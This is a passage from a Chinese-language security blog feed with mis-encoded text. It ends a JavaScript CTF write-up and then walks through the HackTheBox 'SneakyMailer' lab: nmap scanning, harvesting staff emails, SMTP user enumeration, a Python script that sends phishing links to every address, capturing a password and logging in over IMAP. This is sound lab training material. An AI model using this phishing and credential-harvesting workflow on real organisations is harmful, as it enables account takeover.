&#125;</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">guess</span>(<span class="params">i, guesskey</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; guesskey.length; j++) </span><br><span class="line">    &#123;</span><br><span class="line">        key[(i+j) % <span class="number">9</span>] = xor(guesskey[j], func[i + j])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key.join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; func.length - <span class="number">9</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line">    key = guess(i, <span class="string">'document.'</span>);</span><br><span class="line">    finalbuffer = decode(key);</span><br><span class="line">    <span class="keyword">if</span> (finalbuffer.indexOf(<span class="string">'document.location'</span>) != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i, key, finalbuffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‹¿åˆ°ç”¨æˆ·åå¯†ç </p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ç®€å•å°ç»“ä¸‹ï¼Œjsçš„trickè¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸è¿‡è¿™å‡ é“é¢˜æ¥è§¦åˆ°trickçš„å±‚é¢å¾ˆæµ…ã€‚çœŸæ­£CTFæ¯”èµ›ä¸­è¿ç”¨åˆ°å¼±ç±»å‹ä¹‹ç±»çš„å€’æ˜¯æ¯”è¾ƒæœ‰æ„æ€ã€‚è€Œè¿™äº›challengeæ›´å¤šçš„å°±æ˜¯åˆ©ç”¨jsæ¥æ··æ·†è§†å¬ä¹‹ç±»çš„ï¼Œæ‰€ä»¥è€å®è¯´æ¯”è¾ƒè€ƒéªŒä»£ç å®¡è®¡çš„è€å¿ƒè·Ÿdebugæ°´å¹³ã€‚<br>  è¿™ä¸ªå¹³å°çš„jailç³»åˆ—æœ‰æ—¶é—´ä¼šå»åšåšã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-SneakyMailer</title>
      <link href="2020/07/16/hackthebox-SneakyMailer/"/>
      <url>2020/07/16/hackthebox-SneakyMailer/</url>
      
        <content type="html"><![CDATA[<p>SneakyMaileræ˜¯è‡ªå·±åœ¨htbä¸Šå®Œæˆçš„ç¬¬30å°é¶æœºã€‚å› ä¸ºç‰¹æ®Šçºªå¿µæ„ä¹‰åŠ ä¸Šæ¶‰åŠåˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„çŸ¥è¯†æ‰€ä»¥è®°å½•ä¸‹ã€‚æ•´ä½“éš¾åº¦æ¯”è¾ƒç®€å•ã€‚</p><p>ç”±äºSneakyMailerè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚<br>ps:å·²é€€å½¹<br><img src="/2020/07/16/hackthebox-SneakyMailer/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><a id="more"></a><ul><li>é¶æœºipï¼š 10.10.10.197</li><li>æ”»å‡»æœºï¼š 10.10.14.87</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>é¦–å…ˆä¸Šnmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Mon Jul 13 10:04:34 2020 as: nmap -sC -sV -oA nmap/sneakymailer 10.10.10.197</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.197</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">21/tcp   open  ftp      vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)</span><br><span class="line">|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)</span><br><span class="line">|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:<span class="built_in">fc</span>:1a (ED25519)</span><br><span class="line">25/tcp   open  smtp     Postfix smtpd</span><br><span class="line">|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, </span><br><span class="line">80/tcp   open  http     nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Did not follow redirect to http://sneakycorp.htb</span><br><span class="line">143/tcp  open  imap     Courier Imapd (released 2018)</span><br><span class="line">|_imap-capabilities: ENABLE THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 OK QUOTA SORT CHILDREN STARTTLS IMAP4rev1 THREAD=REFERENCES ACL2=UNION NAMESPACE ACL IDLE CAPABILITY completed UIDPLUS</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Subject Alternative Name: email:postmaster@example.com</span><br><span class="line">| Not valid before: 2020-05-14T17:14:21</span><br><span class="line">|_Not valid after:  2021-05-14T17:14:21</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">993/tcp  open  ssl/imap Courier Imapd (released 2018)</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Subject Alternative Name: email:postmaster@example.com</span><br><span class="line">| Not valid before: 2020-05-14T17:14:21</span><br><span class="line">|_Not valid after:  2021-05-14T17:14:21</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">8080/tcp open  http     nginx 1.14.2</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Mon Jul 13 10:05:43 2020 -- 1 IP address (1 host up) scanned in 68.86 seconds</span></span><br></pre></td></tr></table></figure><p>nmapå¾—åˆ°ç»“æœæœ‰å¤šä¸ªç«¯å£å¼€æ”¾ï¼Œå…¶ä¸­ä¸å¤ªå¸¸è§„çš„æ˜¯25,143,993ç­‰ç«¯å£ã€‚æ­£å¦‚ç»“æœæ‰€ç¤ºï¼Œè¿™äº›ç«¯å£éƒ½ä¸é‚®ä»¶æœ‰å…³ã€‚å…¶ä¸­25æ˜¯smtpç«¯å£ã€‚143,993æ˜¯imapçš„é»˜è®¤ä¸¤ä¸ªç«¯å£ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯æ˜æ–‡ä¸€ä¸ªæ˜¯sslåŠ å¯†ã€‚</p><p>21ftpç«¯å£ä¸èƒ½åŒ¿åç™»å½•ã€‚é‚£æˆ‘ä»¬å…ˆä»80ç«¯å£å¼€å§‹ã€‚å¼€å§‹ä¸€ä¸ªè·³è½¬ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠ<code>sneakycorp.htb</code>åŠ å…¥åˆ°<code>/etc/hosts</code>ä¸­ã€‚webé¡µé¢ç»“æœåªæœ‰index.phpä¸team.phpå­˜åœ¨ã€‚è€Œteam.phpæºç ä¸­å­˜åœ¨å‡ åä¸ªemail.å‡æ˜¯<code>xxx@sneakymailer.htb</code>å½¢å¼ã€‚<br>æœæ–­å…ˆæŠŠmailæ”¶é›†èµ·æ¥ã€‚å¹¶ä¸”userè·Ÿmailå„å­˜ä¸€ä»½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://sneakycorp.htb/team.php'</span></span><br><span class="line">r=requests.get(url)</span><br><span class="line">mail=re.findall(<span class="string">r'&lt;td&gt;(.*)@sneakymailer.htb'</span>,r.text)</span><br><span class="line">f=open(<span class="string">'user.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mail:</span><br><span class="line"><span class="comment">#f.write(i+'\n')</span></span><br><span class="line">    f.write(i+<span class="string">'@sneakymailer.htb'</span>+<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>ç„¶åæºç ä¸­æç¤ºäº†ä¸€ä¸ª<code>pypi/register.php</code>ã€‚è®¿é—®åä¼¼ä¹å¯ä»¥æä¾›æ³¨å†ŒåŠŸèƒ½ã€‚ä½†æ˜¯æ ¹æ®ç®€å•çš„å‡ ä¸ªdemoæ„Ÿè§‰è¿˜æ˜¯ä¸ªé™æ€æ–‡ä»¶ã€‚å› ä¸ºå‡å¦‚å†æ¬¡è¾“å…¥å¯†ç è·ŸåŸå¯†ç ä¸ä¸€è‡´å®ƒä¹Ÿæ²¡æœ‰è¿›è¡Œä»»ä½•æŠ¥é”™ã€‚é‚£ä¹ˆæˆ‘æœ‰ç†ç”±æ€€ç–‘æ•´ä¸ªç½‘ç«™éƒ½é™æ€çš„ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤åªèƒ½ä»å‡ ä¸ªé‚®ä»¶æœåŠ¡å™¨å…¥æ‰‹enumäº†ã€‚è¿™é‡Œæˆ‘å…ˆå»äº†è§£äº†ä¸‹<code>smtp</code>,<code>imap</code>çš„ç›¸å…³ä¿¡æ¯ä»¥åŠå¸¸è§æ¼æ´ã€‚ç®€å•æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p><ul><li>smtpä¸»è¦ç”¨äºå‘é€é‚®ä»¶ã€‚imapä¸»è¦ç”¨äºæ¥æ”¶é‚®ä»¶</li><li>smtp/imap server å‡å¯ä½¿ç”¨ telnet,ncè¿›è¡Œè¿æ¥</li><li>smtpå¯ä»¥åœ¨ä¸ç™»å½•çš„æƒ…å†µä¸‹è¿›è¡Œusernameçš„æšä¸¾ã€‚imapå¿…é¡»ç™»å½•æ‰èƒ½è¿›è¡Œæ¥ä¸‹æ¥çš„æŸ¥çœ‹é‚®ä»¶ä¿¡æ¯ç­‰æ“ä½œ</li></ul><p>å¹¶ä¸”ä¸¤ç§æœåŠ¡åŸºæœ¬ä¸Šä¸å­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´ã€‚çœ‹æ¥æ˜¯è¦è¿›è¡Œä¿¡æ¯æšä¸¾äº†ã€‚<br>é¦–å…ˆä»25ç«¯å£å¼€å§‹ã€‚å‰é¢æåˆ°äº†ã€‚é’ˆå¯¹smtpçš„enumä¸»è¦å°±åªæœ‰ç”¨æˆ·åçš„enum.æˆ‘ä»¬æ— æ³•è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚<br>è¿™ç¯‡<a href="https://www.hackingarticles.in/4-ways-smtp-enumeration/" target="_blank" rel="noopener">æ–‡ç« </a>è®²çš„éå¸¸å…¨é¢ã€‚æˆ‘ä¹ŸåŸºæœ¬ä¸Šå…ˆæŒ‰ç…§è¿™ä¸ªæµç¨‹æ¥ã€‚æ¯”å¦‚é¦–å…ˆè¿›è¡Œæ‰‹åŠ¨æµ‹è¯•<code>VRFY root</code>ã€‚å¾—åˆ°252.è¯´æ˜rootç”¨æˆ·æ˜¯åœ¨æœºå™¨ä¸Šçš„ã€‚ä¸è¿‡ç»è¿‡å‰é¢nmapçš„æ¢æµ‹,ä¼¼ä¹èƒ½ä½¿ç”¨çš„smtpå‘½ä»¤éå¸¸å±€é™ã€‚çœ‹æ¥æˆ‘ä»¬åªèƒ½ä»<code>VRFY</code>ä¸‹æ‰‹äº†ã€‚</p><p>è¿™é‡Œä½¿ç”¨msfçš„æ¨¡å—è¿›è¡Œenum,å…·ä½“æ–¹æ³•å‚è€ƒä¸Šé¢æ–‡ç« ã€‚å…¶å®ä¹‹å‰ä½¿ç”¨äº†smtp-user-enumã€‚ä½†ä¼¼ä¹å­˜åœ¨é—®é¢˜,æ²¡æœ‰å¾—åˆ°æˆ‘æƒ³è¦çš„ç»“æœã€‚æ¢äº†msfçš„æ¨¡å—å°±å¥½äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smtp/smtp_enum) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)</span><br><span class="line">[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb</span><br><span class="line">[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥æˆ‘ä»¬å¾—åˆ°çš„é‚®ç®±éƒ½æ˜¯æœ‰æ•ˆçš„â€¦â€¦åˆ°è¿™ä¸€æ­¥å°±å¾ˆéš¾è¿›ä¸€æ­¥è¿›è¡Œå‘å±•äº†ã€‚å› ä¸ºsmtpçš„åˆ©ç”¨æœ€å¤šåˆ°æšä¸¾ç”¨æˆ·åã€‚imapä¸ftpåˆéœ€è¦ç”¨æˆ·å¯†ç ã€‚8080ç«¯å£è·‘ç€ä¸€ä¸ªä¼¼ä¹è£¸çš„nginx.é¡¿æ—¶å°‘äº†æ€è·¯</p><p>å»è®ºå›é€›äº†ä¸€åœˆã€‚å‘ç°å¤§å®¶æåˆ°äº†é’“é±¼çš„è¯´æ³•ã€‚éš¾ä¸æˆæ˜¯è¦å‘é€é‚®ä»¶ï¼Ÿç®€å•æœç´¢äº†ä¸‹å‘ç°pythonæ”¯æŒæˆ‘ä»¬è°ƒç”¨smtpæœåŠ¡å™¨è¿›è¡Œemailçš„å‘é€ã€‚é‚£å°±æŒ‰ç…§èœé¸Ÿæ•™ç¨‹çš„è„šæœ¬æ”¹æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"> </span><br><span class="line">sender = <span class="string">'byc@bycsec.top'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'mail.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    receivers = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">message = MIMEText(<span class="string">'http://10.10.14.87'</span>, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'From'</span>] = Header(<span class="string">"byc"</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'To'</span>] =  Header(<span class="string">"aaa"</span>, <span class="string">'utf-8'</span>)     </span><br><span class="line"> </span><br><span class="line">subject = <span class="string">'Sth Really Helpful'</span></span><br><span class="line">message[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    smtpObj = smtplib.SMTP(<span class="string">'10.10.10.197'</span>,<span class="number">25</span>)</span><br><span class="line">    smtpObj.sendmail(sender, receivers, message.as_string())</span><br><span class="line">    print(<span class="string">"[*] success"</span>)</span><br><span class="line"><span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">    print(<span class="string">"[*] Error"</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯æ›´æ”¹<code>smtplib.SMTP(&#39;10.10.10.197&#39;,25)</code>ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½ä½¿ç”¨htbçš„smtpæœåŠ¡å™¨è¿›è¡Œå‘é€é‚®ä»¶ã€‚åŒæ—¶<code>receivers</code>è¿™ä¸ªå‚æ•°æ˜¯æ”¯æŒpythonåˆ—è¡¨çš„ã€‚æ‰€ä»¥ç›´æ¥ä¼ å…¥æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„æ‰€æœ‰email.æœ€åå†…å®¹ç›´æ¥ç»™æˆ‘ä»¬è‡ªå·±ip.çœ‹çœ‹ä¼šä¸ä¼šæœ‰ç‚¹å‡»åŠ«æŒçš„ä¿¡æ¯å‘è¿‡æ¥ã€‚</p><p>å‘ç°æœ‰postä¿¡æ¯ã€‚é‚£ä¹ˆå†è·‘éè„šæœ¬,ç›´æ¥åˆ‡æ¢æˆncæ¥æ”¶<br><img src="/2020/07/16/hackthebox-SneakyMailer/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœ‹èµ·æ¥paulç”¨æˆ·çš„è´¦å·å¯†ç åˆ°æ‰‹äº†ã€‚ï¼ˆç»å…¸é’“é±¼åœºæ™¯ï¼‰<br>æ¥ä¸‹æ¥å› ä¸ºè¿™æ˜¯é‚®ç®±ç”¨æˆ·ï¼Œæˆ‘ä»¬ç”¨imapè´¦æˆ·æˆåŠŸç™»å½•<br>å…³äºimapçš„<a href="https://www.atmail.com/blog/imap-101-manual-imap-sessions/" target="_blank" rel="noopener">å‘½ä»¤æ‰§è¡Œ </a><br>çœ‹äº†è¿™ç¯‡æ–‡ç« åº”è¯¥å°±ä¼šæ“ä½œäº†ã€‚ç®€å•çš„è¯´å°±æ˜¯åœ¨æ¯ä¸ªå‘½ä»¤å‰éƒ½è¦åŠ ä¸ªå­—æ¯åšå‰ç¼€ã€‚ç„¶åæ‰§è¡Œ<code>LOGIN</code>,<code>SELECT</code>ç­‰æ“ä½œ<br>ç¬¬ä¸€æ­¥å…ˆæŸ¥çœ‹namespaceã€‚ç„¶åå‘ç°æˆ‘ä»¬çš„Personal Namespaceæœ‰<code>INBOX.</code>å­˜åœ¨ã€‚æ‰€ä»¥ç»§ç»­åˆ—  <code>INBOX.</code>ä¸‹çš„æ–‡ä»¶å¤¹ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€‰å®šä¸€ä¸ªæ–‡ä»¶å¤¹äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~<span class="comment"># telnet 10.10.10.197 143</span></span><br><span class="line">Trying 10.10.10.197...</span><br><span class="line">Connected to 10.10.10.197.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING <span class="keyword">for</span> distribution information.</span><br><span class="line">a login paulbyrd ^(<span class="comment">#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span></span><br><span class="line">* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check <span class="keyword">for</span> configuration errors with the FAM/Gamin library)</span><br><span class="line">a OK LOGIN Ok.</span><br><span class="line">n namespace</span><br><span class="line">* NAMESPACE ((<span class="string">"INBOX."</span> <span class="string">"."</span>)) NIL ((<span class="string">"#shared."</span> <span class="string">"."</span>)(<span class="string">"shared."</span> <span class="string">"."</span>))</span><br><span class="line">n OK NAMESPACE completed.</span><br><span class="line">A1 list <span class="string">"INBOX."</span> <span class="string">"*"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Trash"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Sent"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Deleted Items"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Sent Items"</span></span><br><span class="line">A1 OK LIST completed</span><br></pre></td></tr></table></figure><p>ç»è¿‡å°è¯•å‘ç°åªæœ‰INBOX.Sent Itemsé‡Œæœ‰<code>2 EXISTS</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">g21 SELECT <span class="string">"INBOX.Sent Items"</span></span><br><span class="line">* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)</span><br><span class="line">* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited</span><br><span class="line">* 2 EXISTS</span><br><span class="line">* 0 RECENT</span><br><span class="line">* OK [UIDVALIDITY 589480766] Ok</span><br><span class="line">* OK [MYRIGHTS <span class="string">"acdilrsw"</span>] ACL</span><br><span class="line">g21 OK [READ-WRITE] Ok</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¾æ¬¡æŸ¥çœ‹é‚®ä»¶ä¸»é¢˜ä¸å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">f fetch 1:2 (BODY[HEADER.FIELDS (Subject)])</span><br><span class="line">* 1 FETCH (BODY[HEADER.FIELDS (<span class="string">"Subject"</span>)] 